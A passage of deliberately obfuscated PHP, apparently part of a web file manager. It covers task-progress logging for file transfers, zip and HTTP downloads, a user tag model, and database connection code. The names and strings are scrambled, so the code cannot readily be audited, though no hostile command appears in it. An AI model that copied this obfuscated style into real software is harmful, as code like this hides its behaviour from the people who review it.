(isset($øş÷Øâ“[$ßÕ‹Š¨×[1857]]) && $øş÷Øâ“[$ßÕ‹Š¨×[1857]] == $ë…ßç÷İ) { $şñĞ·È = 0; } $this->update($şñĞ·È); } else { $this->update(); $øş÷Øâ“[$ßÕ‹Š¨×[1847]] = 0; } Cache::remove($øş÷Øâ“[$ßÕ‹Š¨×[477]] . $ßÕ‹Š¨×[1860]); self::log($ßÕ‹Š¨×[1863] . $ë…ßç÷İ . $ßÕ‹Š¨×[73] . $ıäö§¡ñ . $ßÕ‹Š¨×[288] . $»¯›ßÊö . $ßÕ‹Š¨×[1864] . $øş÷Øâ“[$ßÕ‹Š¨×[1844]]); } public function updateFileEnd($áèÕÖÑ, $ª¸Ì£÷) { $ë™‰ˆ¿ =& $_SERVER[ıÚ˜š²İ]; $™Ô—©¶ =& $this->task; $™Ô—©¶[$ë™‰ˆ¿[1844]] = $áèÕÖÑ; $™Ô—©¶[$ë™‰ˆ¿[1846]] = $ª¸Ì£÷; $™Ô—©¶[$ë™‰ˆ¿[1850]] += $ª¸Ì£÷; $™Ô—©¶[$ë™‰ˆ¿[1851]] = $™Ô—©¶[$ë™‰ˆ¿[1850]]; $this->update(1); self::log($ë™‰ˆ¿[1865] . $áèÕÖÑ); } public function sourceModelCopy($ôÒƒí‹ê) { $‘ŒçŞ•ª =& $_SERVER[ıÚ˜š²İ]; $êó¼¤—ş = $ôÒƒí‹ê[0]; $—ä¨¨²Ù = $ôÒƒí‹ê[1]; $ç÷ëôíš =& $this->task; $this->sourceModelCopyFlag = !0; $Ğ‘êˆüÀ = 0; switch ($êó¼¤—ş) { case $‘ŒçŞ•ª[642]: $Ğ‘êˆüÀ = 1; break; case $‘ŒçŞ•ª[645]: $ç÷ëôíš[$‘ŒçŞ•ª[1844]] = $—ä¨¨²Ù[$‘ŒçŞ•ª[32]]; break; case $‘ŒçŞ•ª[647]: $Ğ‘êˆüÀ = intval($ôÒƒí‹ê[$‘ŒçŞ•ª[458]] * 0.4); break; case $‘ŒçŞ•ª[649]: $Ğ‘êˆüÀ = intval($ôÒƒí‹ê[$‘ŒçŞ•ª[458]] * 0.2); break; case $‘ŒçŞ•ª[651]: $Ğ‘êˆüÀ = intval($ôÒƒí‹ê[$‘ŒçŞ•ª[458]] * 0.4); break; } $this->update($Ğ‘êˆüÀ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Éù¯¤Öó, $ì÷ƒÆİ†) { $ìçûß÷Î =& $_SERVER[ıÚ˜š²İ]; $this->sourceModelCopyFlag = !0; $ÜÔà§”¶ = 1; if (isset($Éù¯¤Öó[$ìçûß÷Î[82]])) { $ÜÔà§”¶ = $Éù¯¤Öó[$ìçûß÷Î[82]][$ìçûß÷Î[80]]; $ÜÔà§”¶ = $ÜÔà§”¶ + $Éù¯¤Öó[$ìçûß÷Î[82]][$ìçûß÷Î[81]] + 1; } $this->update($ÜÔà§”¶); $this->sourceModelCopyFlag = !1; } public function sourceMove($¼ËÉ×“ô) { $this->sourceRemove($¼ËÉ×“ô, !1); } public function curlProgress($—…ùƒ§µ, $‰£ƒ, $‰ç¬Ÿã™, $üÓŸãö°, $Şçß²ç) { $–Š›±Í© =& $_SERVER[ıÚ˜š²İ]; $ıö‰¡Š =& $this->task; if ($Şçß²ç > 0) { $ıö‰¡Š[$–Š›±Í©[1154]] = $–Š›±Í©[1866]; $ıö‰¡Š[$–Š›±Í©[1848]] = $–Š›±Í©[110]; if ($ıö‰¡Š[$–Š›±Í©[1846]]) { $ıö‰¡Š[$–Š›±Í©[1847]] = $Şçß²ç; } if ($ıö‰¡Š[$–Š›±Í©[1849]]) { $ıö‰¡Š[$–Š›±Í©[1847]] = $Şçß²ç + $ıö‰¡Š[$–Š›±Í©[1849]]; } } else { if ($‰ç¬Ÿã™ > 0) { if ($ıö‰¡Š[$–Š›±Í©[1846]] == $‰£ƒ) { $ıö‰¡Š[$–Š›±Í©[1847]] = $‰ç¬Ÿã™; $ıö‰¡Š[$–Š›±Í©[1154]] = $–Š›±Í©[1867]; $ıö‰¡Š[$–Š›±Í©[1848]] = $–Š›±Í©[1293]; } } } $this->update(); } public function curlProgressStart($µê†ÌÔß) { } public function curlProgressEnd($ù§´Œñá) { $İûìºƒ =& $_SERVER[ıÚ˜š²İ]; $Óªˆ†ï =& $this->task; $…ÏÌÚîÜ = curl_getinfo($ù§´Œñá); $µèç°§ã = $…ÏÌÚîÜ[$İûìºƒ[1868]]; if ($µèç°§ã == -1) { $µèç°§ã = $…ÏÌÚîÜ[$İûìºƒ[1869]]; } if ($Óªˆ†ï[$İûìºƒ[1848]] == $İûìºƒ[110] && $µèç°§ã) { $Óªˆ†ï[$İûìºƒ[1849]] += $µèç°§ã; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $›£¾ÛÑ =& $_SERVER[ıÚ˜š²İ]; $ûşûçÖ¹ =& $this->task; $ûşûçÖ¹[$›£¾ÛÑ[1870]] = 1; Hook::bind($›£¾ÛÑ[1838], array($this, $›£¾ÛÑ[1871])); Hook::bind($›£¾ÛÑ[1840], array($this, $›£¾ÛÑ[1872])); Hook::bind($›£¾ÛÑ[1842], array($this, $›£¾ÛÑ[1873])); } protected function endAfter() { $Š­Ã±Ş™ =& $_SERVER[ıÚ˜š²İ]; Hook::unbind($Š­Ã±Ş™[1838], array($this, $Š­Ã±Ş™[1871])); Hook::unbind($Š­Ã±Ş™[1840], array($this, $Š­Ã±Ş™[1872])); Hook::unbind($Š­Ã±Ş™[1842], array($this, $Š­Ã±Ş™[1873])); } public function progressStart($²ƒ”ÙŞÓ) { $—İÆ›Ê =& $_SERVER[ıÚ˜š²İ]; $õ›œÁ¼Ò = curl_getinfo($²ƒ”ÙŞÓ); self::log($—İÆ›Ê[1874] . $õ›œÁ¼Ò[$—İÆ›Ê[384]]); self::valueSet($this->task[$—İÆ›Ê[477]], $this->task); } public function progressEnd($ÃïÜÈ£î) { $İ›“Ûà =& $_SERVER[ıÚ˜š²İ]; self::log($İ›“Ûà[1875] . $this->task[$İ›“Ûà[477]]); $this->end(); } public function progress($»Ô„®·, $šİåà¦­, $å‡šºÖ‰, $±†ã‡äé, $šÍØ¯àÅ) { $ÈÔ¬†¯ =& $_SERVER[ıÚ˜š²İ]; $«¥Ò„ğ =& $this->task; if ($šÍØ¯àÅ > 0) { $«¥Ò„ğ[$ÈÔ¬†¯[1152]] = $«¥Ò„ğ[$ÈÔ¬†¯[1152]] == 0 ? $±†ã‡äé : $«¥Ò„ğ[$ÈÔ¬†¯[1152]]; $«¥Ò„ğ[$ÈÔ¬†¯[1793]] = $šÍØ¯àÅ; } else { if ($å‡šºÖ‰ > 0) { $«¥Ò„ğ[$ÈÔ¬†¯[1152]] = $«¥Ò„ğ[$ÈÔ¬†¯[1152]] == 0 ? $šİåà¦­ : $«¥Ò„ğ[$ÈÔ¬†¯[1152]]; $«¥Ò„ğ[$ÈÔ¬†¯[1793]] = $å‡šºÖ‰; } } $this->update(); self::log("\x70\162\157\147\x72\x65\x73\x73\110\x74\x74\160\x3a\144\157\x77\x6e\x3a{$å‡šºÖ‰}\x2f{$šİåà¦­}\73\40\x75\x70\x6c\157\141\144\72{$šÍØ¯àÅ}\x2f{$±†ã‡äé}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($©óŠ‰“‰, $±Ÿğ’ı = '', $¯æ—Ç = 0, $äÊù•àª = '') { $£Ô·åÇ =& $_SERVER[ıÚ˜š²İ]; $äÊù•àª = $äÊù•àª ? $äÊù•àª : ($±Ÿğ’ı ? $±Ÿğ’ı : $©óŠ‰“‰); $¸¶ôÚ® = new Task($©óŠ‰“‰, $±Ÿğ’ı, $¯æ—Ç, $äÊù•àª); $GLOBALS[$£Ô·åÇ[1876] . $©óŠ‰“‰] = new TaskLog($£Ô·åÇ[1775], $¸¶ôÚ®, $äÊù•àª); return $¸¶ôÚ®; } public function __construct($ß‰Ãê²Ñ = '', $ù¶±‹ã = '', $Ñ‹õÏƒº = '') { $íÜÈÃó½ =& $_SERVER[ıÚ˜š²İ]; if (!$ß‰Ãê²Ñ) { $ß‰Ãê²Ñ = $íÜÈÃó½[1775]; } $…¿‹„Ò¦ = $ß‰Ãê²Ñ . $íÜÈÃó½[464] . rand_string(10); if (!$Ñ‹õÏƒº) { $Ñ‹õÏƒº = $ß‰Ãê²Ñ . $íÜÈÃó½[53] . $Ñ‹õÏƒº; } switch ($ß‰Ãê²Ñ) { case $íÜÈÃó½[1775]: if (!$ù¶±‹ã || !$ù¶±‹ã->task) { return echoLog($ß‰Ãê²Ñ . $íÜÈÃó½[1877]); } $ğµ¦šµ = $ù¶±‹ã; $…¿‹„Ò¦ = $ğµ¦šµ->task[$íÜÈÃó½[477]]; $ß‰Ãê²Ñ = $ğµ¦šµ->task[$íÜÈÃó½[477]]; if (!$ğµ¦šµ->task[$íÜÈÃó½[1680]]) { $ğµ¦šµ->task[$íÜÈÃó½[1680]] = $Ñ‹õÏƒº ? $Ñ‹õÏƒº : $ß‰Ãê²Ñ; } break; case $íÜÈÃó½[1878]: if (!$ù¶±‹ã) { return echoLog($ß‰Ãê²Ñ . $íÜÈÃó½[1879]); } $ÑòçÍŞ¿ = is_string($ù¶±‹ã) ? array($ù¶±‹ã) : $ù¶±‹ã; $ğµ¦šµ = new TaskFileTransfer($…¿‹„Ò¦, $ß‰Ãê²Ñ, 0, $Ñ‹õÏƒº ? $Ñ‹õÏƒº : $ÑòçÍŞ¿[0]); foreach ($ÑòçÍŞ¿ as $¶àªŞî¦) { $ğµ¦šµ->addPath($¶àªŞî¦); } break; case $íÜÈÃó½[390]: if (!$ù¶±‹ã) { return echoLog($ß‰Ãê²Ñ . $íÜÈÃó½[1879]); } $ÑòçÍŞ¿ = is_string($ù¶±‹ã) ? array($ù¶±‹ã) : $ù¶±‹ã; $ğµ¦šµ = new TaskZip($…¿‹„Ò¦, $ß‰Ãê²Ñ, 0, $Ñ‹õÏƒº ? $Ñ‹õÏƒº : $ÑòçÍŞ¿[0]); foreach ($ÑòçÍŞ¿ as $¶àªŞî¦) { $ğµ¦šµ->addPath($¶àªŞî¦); } break; case $íÜÈÃó½[1313]: if (!$ù¶±‹ã) { return echoLog($ß‰Ãê²Ñ . $íÜÈÃó½[1879]); } $ğµ¦šµ = new TaskUnZip($…¿‹„Ò¦, $ß‰Ãê²Ñ, 0, $Ñ‹õÏƒº ? $Ñ‹õÏƒº : $ù¶±‹ã); if ($ù¶±‹ã) { $ğµ¦šµ->addFile($ù¶±‹ã); } break; case $íÜÈÃó½[152]: $ğµ¦šµ = new TaskHttp($…¿‹„Ò¦, $ß‰Ãê²Ñ); break; default: return; break; } $this->task = $ğµ¦šµ; $this->taskID = $…¿‹„Ò¦; Hook::bind($íÜÈÃó½[1813], array($this, $íÜÈÃó½[1880])); Hook::bind($íÜÈÃó½[1815], array($this, $íÜÈÃó½[1881])); Hook::bind($íÜÈÃó½[1809], array($this, $íÜÈÃó½[1882])); echoLog($íÜÈÃó½[1883] . $ğµ¦šµ->task[$íÜÈÃó½[1680]]); } public function __destruct() { $this->end(); } public function end($öòÇóêÇ = '') { $î©ø‚‹¿ =& $_SERVER[ıÚ˜š²İ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($öòÇóêÇ); $this->task = !1; $this->taskID = !1; Hook::unbind($î©ø‚‹¿[1813], array($this, $î©ø‚‹¿[1880])); Hook::unbind($î©ø‚‹¿[1815], array($this, $î©ø‚‹¿[1881])); Hook::unbind($î©ø‚‹¿[1809], array($this, $î©ø‚‹¿[1882])); } public function taskUpdate($š»ã›Ø) { $ò¦úÜ‘ =& $_SERVER[ıÚ˜š²İ]; if (!$š»ã›Ø || $this->taskID != $š»ã›Ø[$ò¦úÜ‘[477]]) { return; } $şäÂ = 20; $³£şåĞÏ = intval($š»ã›Ø[$ò¦úÜ‘[1794]] * $şäÂ); $óÍüúÛ = $ò¦úÜ‘[176] . str_repeat($ò¦úÜ‘[508], $³£şåĞÏ) . $ò¦úÜ‘[1103] . str_repeat($ò¦úÜ‘[53], $şäÂ - $³£şåĞÏ) . $ò¦úÜ‘[178]; $ß›¼›Ëü = $óÍüúÛ . sprintf($ò¦úÜ‘[1884], $š»ã›Ø[$ò¦úÜ‘[1794]] * 100) . $ò¦úÜ‘[1885]; $ØÖ¾øéõ = $ß›¼›Ëü . $š»ã›Ø[$ò¦úÜ‘[1793]] . $ò¦úÜ‘[8] . $š»ã›Ø[$ò¦úÜ‘[1152]] . LNG($ò¦úÜ‘[1886]); $ÊÕû”Ï = $ò¦úÜ‘[12]; if ($š»ã›Ø[$ò¦úÜ‘[1870]]) { $ØÖ¾øéõ = $ß›¼›Ëü . size_format($š»ã›Ø[$ò¦úÜ‘[1793]]) . $ò¦úÜ‘[8] . size_format($š»ã›Ø[$ò¦úÜ‘[1152]]); $ÊÕû”Ï = size_format($š»ã›Ø[$ò¦úÜ‘[1795]]) . $ò¦úÜ‘[1887]; } if ($š»ã›Ø[$ò¦úÜ‘[1154]]) { $š»ã›Ø[$ò¦úÜ‘[1844]] = $š»ã›Ø[$ò¦úÜ‘[1154]] . $ò¦úÜ‘[53] . $š»ã›Ø[$ò¦úÜ‘[1844]]; } if ($š»ã›Ø[$ò¦úÜ‘[1844]]) { $Î¾ÕÍ‹» = $ò¦úÜ‘[12]; if ($š»ã›Ø[$ò¦úÜ‘[1846]]) { $Î¾ÕÍ‹» = $ò¦úÜ‘[50] . size_format($š»ã›Ø[$ò¦úÜ‘[1847]]) . $ò¦úÜ‘[8] . size_format($š»ã›Ø[$ò¦úÜ‘[1846]]); } $ÊÕû”Ï .= $š»ã›Ø[$ò¦úÜ‘[1844]] . $Î¾ÕÍ‹»; } if ($š»ã›Ø[$ò¦úÜ‘[840]] && !$š»ã›Ø[$ò¦úÜ‘[1846]]) { $ÊÕû”Ï .= $ò¦úÜ‘[53] . size_format($š»ã›Ø[$ò¦úÜ‘[1851]]) . $ò¦úÜ‘[8] . size_format($š»ã›Ø[$ò¦úÜ‘[840]]); } echoLog($ØÖ¾øéõ . $ò¦úÜ‘[53] . $ÊÕû”Ï, !0); } public function taskEnd($ÎíÏ£š) { $ôÔ¼„–Ó =& $_SERVER[ıÚ˜š²İ]; if (!$ÎíÏ£š || $this->taskID != $ÎíÏ£š[$ôÔ¼„–Ó[477]]) { return; } $ˆ†™ëë… = $ÎíÏ£š ? LNG($ôÔ¼„–Ó[1888]) . $ôÔ¼„–Ó[4] . $ÎíÏ£š[$ôÔ¼„–Ó[1793]] . $ôÔ¼„–Ó[8] . $ÎíÏ£š[$ôÔ¼„–Ó[1152]] . LNG($ôÔ¼„–Ó[1886]) . $ôÔ¼„–Ó[74] : $ôÔ¼„–Ó[12]; echoLog($ôÔ¼„–Ó[1889] . $ÎíÏ£š[$ôÔ¼„–Ó[1680]] . ($ÎíÏ£š[$ôÔ¼„–Ó[528]] ? $ôÔ¼„–Ó[74] . $ÎíÏ£š[$ôÔ¼„–Ó[528]] : $ôÔ¼„–Ó[12]) . $ôÔ¼„–Ó[74] . $ˆ†™ëë… . $ôÔ¼„–Ó[1890] . sprintf($ôÔ¼„–Ó[934], timeFloat() - $ÎíÏ£š[$ôÔ¼„–Ó[1796]]) . $ôÔ¼„–Ó[1808]); $this->end(); } public function taskKill($˜Ò¯º‹¨) { $Ò»³ú¡ =& $_SERVER[ıÚ˜š²İ]; if (!$˜Ò¯º‹¨ || $this->taskID != $˜Ò¯º‹¨[$Ò»³ú¡[477]]) { return; } echoLog($Ò»³ú¡[1891] . $˜Ò¯º‹¨[$Ò»³ú¡[1680]]); } } goto e¯“÷ÚŒğÌ; CÏİ·íÊ‘›: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\x74\x61\147\x4c\151\x73\164"; public $modelType = "\x55\163\145\162\x4f\x70\x74\x69\157\x6e"; public $field = array("\156\141\x6d\145", "\x73\164\171\x6c\145", "\163\157\x72\164"); public function listData($“‡Ìıë… = false, $»²»¦¾ı = "\163\x6f\x72\x74", $¾à‹¥Ğì = false) { return parent::listData($“‡Ìıë…, $»²»¦¾ı, $¾à‹¥Ğì); } public function remove($ÕñÇËÈ) { return parent::remove($ÕñÇËÈ); } public function add($ğŒ÷Ğ‰¼, $æ¶ì¢¤æ = "\154\x61\x62\145\x6c\x2d\147\162\x65\x79\x2d\156\x6f\x72\x6d\x61\x6c") { $ê˜Ñş =& $_SERVER[ıÚ˜š²İ]; if ($this->findByName($ğŒ÷Ğ‰¼)) { return !1; } $ÌûŞŠ´ä = array($ê˜Ñş[496] => $ğŒ÷Ğ‰¼, $ê˜Ñş[562] => $æ¶ì¢¤æ, $ê˜Ñş[1997] => $this->getSort($ê˜Ñş[338]) + 1); return parent::insert($ÌûŞŠ´ä); } public function update($àåµ¼ğÈ, $ê¨şœü²) { $İÑøÆŞò =& $_SERVER[ıÚ˜š²İ]; $˜æ¬¿âŞ = $this->listData($àåµ¼ğÈ); $ÚŠòò¨ˆ = $this->findByName($ê¨şœü²[$İÑøÆŞò[32]]); if (!$˜æ¬¿âŞ || $ÚŠòò¨ˆ && $ÚŠòò¨ˆ[$İÑøÆŞò[477]] != $˜æ¬¿âŞ[$İÑøÆŞò[477]]) { return !1; } return parent::update($àåµ¼ğÈ, $ê¨şœü²); } public function moveTop($æ“Ø˜£Æ) { $ØÂôéÛŞ =& $_SERVER[ıÚ˜š²İ]; $º’Ô’¡İ = parent::listData(); $º—‚âĞ™ = $this->getSort($ØÂôéÛŞ[337]); foreach ($º’Ô’¡İ as &$ş¥õŞ‹©) { if ($ş¥õŞ‹©[$ØÂôéÛŞ[477]] == $æ“Ø˜£Æ) { $ş¥õŞ‹©[$ØÂôéÛŞ[2017]] = $º—‚âĞ™; continue; } $ş¥õŞ‹©[$ØÂôéÛŞ[2017]] += 1; } unset($ş¥õŞ‹©); return parent::resetData($º’Ô’¡İ); } public function moveBottom($†šãÇ) { $ÅæÍƒìè =& $_SERVER[ıÚ˜š²İ]; $­¤í§´— = $this->getSort($ÅæÍƒìè[338]) + 1; return parent::update($†šãÇ, array($ÅæÍƒìè[2017] => $­¤í§´—)); } public function resetSort($‹×ÒËĞ‹) { $çé—××š =& $_SERVER[ıÚ˜š²İ]; $éÖÛï¨¿ = array(); $‹×ÒËĞ‹ = is_array($‹×ÒËĞ‹) ? $‹×ÒËĞ‹ : array(); for ($Î½ì·Ş’ = 0; $Î½ì·Ş’ < count($‹×ÒËĞ‹); $Î½ì·Ş’++) { $éÖÛï¨¿[$‹×ÒËĞ‹[$Î½ì·Ş’] . $çé—××š[12]] = $Î½ì·Ş’ + 1; } $îŠ°ñõ = parent::listData(); foreach ($îŠ°ñõ as &$š³¶ƒ­) { $¾ä»Îµ‘ = $éÖÛï¨¿[$š³¶ƒ­[$çé—××š[477]]]; $š³¶ƒ­[$çé—××š[2017]] = $¾ä»Îµ‘ ? $¾ä»Îµ‘ : $š³¶ƒ­[$çé—××š[2017]]; } unset($š³¶ƒ­); return parent::resetData($îŠ°ñõ); } private function getSort($µ÷×Äë–) { $êÕ•è€¥ =& $_SERVER[ıÚ˜š²İ]; $Ñ­ïŸ = parent::listData(); $Â¥’Õç = array_to_keyvalue($Ñ­ïŸ, $êÕ•è€¥[12], $êÕ•è€¥[2017]); if (!$Â¥’Õç) { $Â¥’Õç = array(0); } $Œöü¤÷ = $µ÷×Äë– == $êÕ•è€¥[338] ? max($Â¥’Õç) : min($Â¥’Õç); return intval($Œöü¤÷); } } goto C¼œóè º“; E†ñéÁ©¨õ: class DbSqlite3 extends DbSqlite3Base { public function query($˜‰ÚÉØ´) { $ÈÔ€ğ’Ş =& $_SERVER[ıÚ˜š²İ]; if (!CacheLock::fileLock($ÈÔ€ğ’Ş[13])) { return !1; } $õÑÉıŠ§ = parent::query($˜‰ÚÉØ´); CacheLock::fileUnLock($ÈÔ€ğ’Ş[13]); return $õÑÉıŠ§; } public function execute($‹€À…™í) { $ğĞş³ =& $_SERVER[ıÚ˜š²İ]; if (!CacheLock::fileLock($ğĞş³[13])) { return !1; } $ó¯„ÙªŸ = parent::execute($‹€À…™í); CacheLock::fileUnLock($ğĞş³[13]); return $ó¯„ÙªŸ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\x65\161" => "\x3c\x3e", "\x67\x74" => "\76", "\x65\147\164" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\75", "\x6e\x6f\x74\x6c\151\x6b\145" => "\116\117\124\x20\x4c\111\113\x45", "\x6c\151\x6b\x65" => "\x4c\111\113\x45", "\x69\156" => "\x49\116", "\156\x6f\164\x69\x6e" => "\116\x4f\x54\40\111\116", "\x6e\157\x74\40\151\x6e" => "\116\x4f\124\x20\x49\116", "\x62\x65\x74\167\145\x65\156" => "\x42\105\x54\127\105\105\x4e", "\156\157\164\142\145\x74\167\x65\145\x6e" => "\x4e\x4f\124\40\102\x45\124\x57\x45\105\x4e", "\156\157\x74\x20\x62\x65\x74\x77\x65\x65\156" => "\x4e\117\x54\40\x42\105\x54\x57\x45\105\116"); protected $selectSql = "\x53\x45\114\x45\x43\x54\45\104\111\123\124\x49\116\103\124\x25\x20\45\106\111\105\x4c\104\x25\40\x46\x52\x4f\115\x20\x25\124\x41\x42\x4c\105\45\45\x4a\117\111\x4e\45\x25\x57\110\105\122\105\x25\x25\x47\122\117\125\120\x25\45\110\x41\x56\111\x4e\x47\45\45\x4f\122\x44\105\122\x25\45\x4c\111\x4d\x49\x54\45\40\x25\x55\x4e\111\x4f\x4e\x25\45\103\117\x4d\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $Ÿª‰ùİè = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ıÚ˜š²İ][1049], $Ÿª‰ùİè); } public function factory($„ş•œîş = '') { $‡Š’Áãæ =& $_SERVER[ıÚ˜š²İ]; $„ş•œîş = $this->parseConfig($„ş•œîş); if (empty($„ş•œîş[$‡Š’Áãæ[1050]])) { think_exception(think_lang($‡Š’Áãæ[1051])); } $this->dbType = ucwords(strtolower($„ş•œîş[$‡Š’Áãæ[1050]])); $ŠäâúÕÛ = $‡Š’Áãæ[1052] . $this->dbType; if (class_exists($ŠäâúÕÛ)) { $—±Øˆ» = new $ŠäâúÕÛ($„ş•œîş); if ($‡Š’Áãæ[1053] != strtolower($„ş•œîş[$‡Š’Áãæ[1050]])) { $—±Øˆ»->dbType = strtoupper($this->dbType); } else { $—±Øˆ»->dbType = $this->_getDsnType($„ş•œîş[$‡Š’Áãæ[1005]]); } } else { think_exception(think_lang($‡Š’Áãæ[1054]) . $‡Š’Áãæ[1055] . $ŠäâúÕÛ); } return $—±Øˆ»; } public function __call($óµŸ­æï, $Á¶½ä©ß) { if (method_exists($this, $óµŸ­æï)) { return call_user_func_array(array($this, $óµŸ­æï), $Á¶½ä©ß); } } protected function _getDsnType($•àá‰ ) { $ÊšÕÈîÛ = explode($_SERVER[ıÚ˜š²İ][4], $•àá‰ ); $±ÙÌãÃ˜ = strtoupper(trim($ÊšÕÈîÛ[0])); return $±ÙÌãÃ˜; } private function parseConfig($àË¹Ú–û = '') { $öÃœ»· =& $_SERVER[ıÚ˜š²İ]; if (!empty($àË¹Ú–û) && is_string($àË¹Ú–û)) { $àË¹Ú–û = $this->parseDSN($àË¹Ú–û); } elseif (is_array($àË¹Ú–û)) { $àË¹Ú–û = array_change_key_case($àË¹Ú–û); $àË¹Ú–û = array($öÃœ»·[1050] => $àË¹Ú–û[$öÃœ»·[1056]], $öÃœ»·[977] => $àË¹Ú–û[$öÃœ»·[1057]], $öÃœ»·[978] => $àË¹Ú–û[$öÃœ»·[1058]], $öÃœ»·[975] => $àË¹Ú–û[$öÃœ»·[1059]], $öÃœ»·[976] => $àË¹Ú–û[$öÃœ»·[1060]], $öÃœ»·[21] => $àË¹Ú–û[$öÃœ»·[1061]], $öÃœ»·[1005] => $àË¹Ú–û[$öÃœ»·[1062]], $öÃœ»·[17] => isset($àË¹Ú–û[$öÃœ»·[1063]]) ? $àË¹Ú–û[$öÃœ»·[1063]] : array()); } elseif (empty($àË¹Ú–û)) { if (think_config($öÃœ»·[1064]) && $öÃœ»·[1053] != strtolower(think_config($öÃœ»·[1065]))) { $àË¹Ú–û = $this->parseDSN(think_config($öÃœ»·[1064])); } else { $àË¹Ú–û = array($öÃœ»·[1050] => think_config($öÃœ»·[1065]), $öÃœ»·[977] => think_config($öÃœ»·[1066]), $öÃœ»·[978] => think_config($öÃœ»·[1067]), $öÃœ»·[975] => think_config($öÃœ»·[1068]), $öÃœ»·[976] => think_config($öÃœ»·[1069]), $öÃœ»·[21] => think_config($öÃœ»·[326]), $öÃœ»·[1005] => think_config($öÃœ»·[1064]), $öÃœ»·[17] => think_config($öÃœ»·[1070])); } } return $àË¹Ú–û; } protected function initConnect($”ç¥û = true) { if (1 == think_config($_SERVER[ıÚ˜š²İ][22])) { $this->_linkID = $this->multiConnect($”ç¥û); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¬‹‰Ú¸á => $€¢¥½Æ”) { $this->_linkID = $€¢¥½Æ”; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($“ãÈ“Ã¤ = false) { $ÀÏ®ì‚Ø =& $_SERVER[ıÚ˜š²İ]; static $ğ€€Ã’Ã = array(); static $Ë«£„ˆÅ = -1; if (empty($ğ€€Ã’Ã)) { foreach ($this->config as $€ ¯á‡š => $°™Úîƒ) { $ğ€€Ã’Ã[$€ ¯á‡š] = explode($ÀÏ®ì‚Ø[50], $°™Úîƒ); } } if (think_config($ÀÏ®ì‚Ø[1071])) { if ($“ãÈ“Ã¤ || think_config($ÀÏ®ì‚Ø[473]) === !0) { $²Ôú±¾‡ = floor(mt_rand(0, think_config($ÀÏ®ì‚Ø[1072]) - 1)); $Ë«£„ˆÅ = $²Ôú±¾‡; } else { if (is_numeric(think_config($ÀÏ®ì‚Ø[1073]))) { $²Ôú±¾‡ = think_config($ÀÏ®ì‚Ø[1073]); } else { $²Ôú±¾‡ = floor(mt_rand(think_config($ÀÏ®ì‚Ø[1072]), count($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[975]]) - 1)); } } } else { $²Ôú±¾‡ = floor(mt_rand(0, count($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[975]]) - 1)); $Ë«£„ˆÅ = $²Ôú±¾‡; } $²Ôú±¾‡ = $Ë«£„ˆÅ !== -1 ? $Ë«£„ˆÅ : $²Ôú±¾‡; $‚•¿”  = array($ÀÏ®ì‚Ø[977] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[977]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[977]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[977]][0], $ÀÏ®ì‚Ø[978] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[978]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[978]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[978]][0], $ÀÏ®ì‚Ø[975] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[975]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[975]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[975]][0], $ÀÏ®ì‚Ø[976] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[976]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[976]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[976]][0], $ÀÏ®ì‚Ø[21] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[21]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[21]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[21]][0], $ÀÏ®ì‚Ø[1005] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[1005]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[1005]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[1005]][0], $ÀÏ®ì‚Ø[17] => isset($ğ€€Ã’Ã[$ÀÏ®ì‚Ø[17]][$²Ôú±¾‡]) ? $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[17]][$²Ôú±¾‡] : $ğ€€Ã’Ã[$ÀÏ®ì‚Ø[17]][0]); return $this->connect($‚•¿” , $²Ôú±¾‡); } public function parseDSN($á¨ÆóÅ) { $õÄ†úñ„ =& $_SERVER[ıÚ˜š²İ]; if (empty($á¨ÆóÅ)) { return !1; } $¤’ƒëïü = parse_url($á¨ÆóÅ); if ($¤’ƒëïü[$õÄ†úñ„[208]]) { $‰€–°ß = array($õÄ†úñ„[1050] => $¤’ƒëïü[$õÄ†úñ„[208]], $õÄ†úñ„[977] => 